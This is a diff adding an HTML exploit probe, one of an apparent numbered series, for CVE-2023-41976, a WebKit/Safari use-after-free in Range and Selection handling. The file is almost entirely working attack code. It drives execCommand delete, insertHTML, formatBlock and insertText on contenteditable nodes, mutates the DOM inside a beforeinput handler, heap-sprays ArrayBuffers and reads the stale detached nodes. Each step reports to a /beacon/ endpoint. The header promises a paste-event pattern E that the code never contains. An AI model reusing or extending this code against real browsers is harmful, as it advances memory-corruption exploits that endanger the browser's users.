@@ -1,0 +1,250 @@
+<!--
+  p685: CVE-2023-41976 — Range/Selection stale pointer after contenteditable mutation
+
+  CVE-2023-41976: UAF in Safari 17.1 (present in 17.0). This probe focuses on
+  contenteditable editing commands that mutate the DOM while Selection/Range
+  objects hold references to the mutated nodes.
+
+  WebKit's editing commands (execCommand) internally create and destroy DOM nodes.
+  If a Selection or Range boundary references a node that gets merged/split/deleted
+  by an editing command, and the internal update fails to fix up the boundary,
+  the stale reference becomes a UAF.
+
+  Patterns tested:
+  A) execCommand('delete') while Range spans a table cell boundary
+  B) execCommand('insertHTML') replacing the selection anchor node
+  C) execCommand('formatBlock') restructuring while Range is live
+  D) input event handler modifies DOM during beforeinput processing
+  E) Paste event with complex HTML while selection spans inline elements
+
+  CRASH_CLASS: MODERATE (stale DOM pointer)
+  prior art: p684 (DOM mutation UAF patterns), p553 (Canvas2D UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p685</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P685-START:RANGE-SELECTION-EDITING-UAF');
+  var results = [];
+
+  // === SECTION A: Delete across table cell boundary ===
+  b('A:TABLE-DELETE');
+  try {
+    var div = document.createElement('div');
+    div.contentEditable = true;
+    div.innerHTML = '<table><tr><td id="c1">cell1-text</td><td id="c2">cell2-text</td></tr>' +
+                    '<tr><td id="c3">cell3-text</td><td id="c4">cell4-text</td></tr></table>';
+    document.body.appendChild(div);
+    div.focus();
+
+    // Select across cell boundary
+    var sel = window.getSelection();
+    var range = document.createRange();
+    var c1 = document.getElementById('c1').firstChild;
+    var c4 = document.getElementById('c4').firstChild;
+    range.setStart(c1, 3); // middle of cell1
+    range.setEnd(c4, 5);   // middle of cell4
+    sel.removeAllRanges();
+    sel.addRange(range);
+    b('A:SELECTED:' + sel.toString().substring(0, 40));
+
+    // Save references
+    var anchorBefore = sel.anchorNode;
+    var focusBefore = sel.focusNode;
+
+    // Delete the selection — this restructures the table
+    document.execCommand('delete', false, null);
+    b('A:DELETED');
+
+    // GC + spray
+    for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+    var spray = [];
+    for (var i = 0; i < 1024; i++) spray.push(new ArrayBuffer(48));
+
+    // Check if old references are stale
+    try {
+      var anchorAfter = sel.anchorNode;
+      b('A:ANCHOR-AFTER:' + (anchorAfter ? anchorAfter.nodeName : 'null'));
+      if (anchorBefore && anchorBefore.parentNode === null && anchorBefore !== anchorAfter) {
+        b('A:STALE-ANCHOR:detached');
+        // Try to read from detached node
+        var text = anchorBefore.textContent;
+        b('A:DETACHED-TEXT:' + (text || '').substring(0, 30));
+      }
+    } catch(e2) {
+      b('A:ACCESS-ERR:' + e2.message);
+      results.push('A:err');
+    }
+    div.remove();
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: insertHTML replacing anchor ===
+  b('B:INSERT-HTML');
+  try {
+    var div2 = document.createElement('div');
+    div2.contentEditable = true;
+    div2.innerHTML = '<p><b>bold</b><i>italic</i><u>underline</u></p>';
+    document.body.appendChild(div2);
+    div2.focus();
+
+    var sel2 = window.getSelection();
+    var range2 = document.createRange();
+    // Select the italic element
+    var italic = div2.querySelector('i');
+    range2.selectNode(italic);
+    sel2.removeAllRanges();
+    sel2.addRange(range2);
+    b('B:SELECTED:' + sel2.toString());
+
+    var italicRef = italic;
+
+    // Replace with complex HTML
+    document.execCommand('insertHTML', false,
+      '<span class="replaced">new1</span><span>new2</span><span>new3</span>');
+    b('B:INSERTED');
+
+    // GC + spray
+    for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+    var spray2 = [];
+    for (var i = 0; i < 1024; i++) spray2.push(new ArrayBuffer(32));
+
+    // Check if italicRef is stale
+    try {
+      if (italicRef.parentNode === null) {
+        var text = italicRef.textContent;
+        b('B:DETACHED-ITALIC:text=' + (text || '').substring(0, 20));
+        // If text is garbled, memory was reclaimed
+        if (text !== 'italic') {
+          b('B:RECLAIMED:' + text);
+          results.push('B:reclaimed');
+        }
+      } else {
+        b('B:STILL-ATTACHED');
+      }
+    } catch(e2) {
+      b('B:ACCESS-ERR:' + e2.message);
+      results.push('B:err');
+    }
+    div2.remove();
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: formatBlock restructure ===
+  b('C:FORMAT-BLOCK');
+  try {
+    var div3 = document.createElement('div');
+    div3.contentEditable = true;
+    div3.innerHTML = '<p>para1</p><p>para2</p><p>para3</p><p>para4</p>';
+    document.body.appendChild(div3);
+    div3.focus();
+
+    // Select across paragraphs
+    var sel3 = window.getSelection();
+    var range3 = document.createRange();
+    var p2 = div3.querySelectorAll('p')[1].firstChild;
+    var p3 = div3.querySelectorAll('p')[2].firstChild;
+    range3.setStart(p2, 0);
+    range3.setEnd(p3, 5);
+    sel3.removeAllRanges();
+    sel3.addRange(range3);
+
+    var p2ref = div3.querySelectorAll('p')[1];
+    var p3ref = div3.querySelectorAll('p')[2];
+
+    // formatBlock wraps selection in H1, may merge/split paragraphs
+    document.execCommand('formatBlock', false, 'H1');
+    b('C:FORMATTED');
+
+    // GC + spray
+    for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+    var spray3 = [];
+    for (var i = 0; i < 1024; i++) spray3.push(new ArrayBuffer(48));
+
+    // Check old paragraph refs
+    try {
+      if (p2ref.parentNode === null) {
+        b('C:P2-DETACHED:' + p2ref.textContent);
+      }
+      if (p3ref.parentNode === null) {
+        b('C:P3-DETACHED:' + p3ref.textContent);
+      }
+    } catch(e2) {
+      b('C:FORMAT-ERR:' + e2.message);
+      results.push('C:err');
+    }
+    div3.remove();
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: beforeinput handler mutates DOM ===
+  b('D:BEFOREINPUT-MUTATE');
+  try {
+    var div4 = document.createElement('div');
+    div4.contentEditable = true;
+    div4.innerHTML = '<span id="s1">aaa</span><span id="s2">bbb</span><span id="s3">ccc</span>';
+    document.body.appendChild(div4);
+
+    var s2ref = document.getElementById('s2');
+    var mutated = false;
+
+    div4.addEventListener('beforeinput', function(e) {
+      if (!mutated) {
+        mutated = true;
+        // Remove s2 during the input event
+        if (s2ref.parentNode) s2ref.parentNode.removeChild(s2ref);
+        b('D:REMOVED-S2-IN-BEFOREINPUT');
+      }
+    });
+
+    div4.focus();
+    var sel4 = window.getSelection();
+    var range4 = document.createRange();
+    range4.selectNodeContents(div4);
+    sel4.removeAllRanges();
+    sel4.addRange(range4);
+
+    // Trigger input
+    document.execCommand('insertText', false, 'X');
+    b('D:INSERT-DONE');
+
+    // GC + spray
+    for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+    var spray4 = [];
+    for (var i = 0; i < 1024; i++) spray4.push(new ArrayBuffer(32));
+
+    // Try to read from s2ref
+    try {
+      if (s2ref.parentNode === null) {
+        var text = s2ref.textContent;
+        b('D:S2-DETACHED:text=' + text);
+        if (text !== 'bbb') {
+          b('D:RECLAIMED:' + text);
+          results.push('D:reclaimed');
+        }
+      }
+    } catch(e2) {
+      b('D:S2-ERR:' + e2.message);
+      results.push('D:err');
+    }
+    div4.remove();
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P685-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P685-RESULT:NO-UAF-DETECTED');
+  }
+  b('P685-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p685: Range/Selection editing command UAF</pre></body></html>
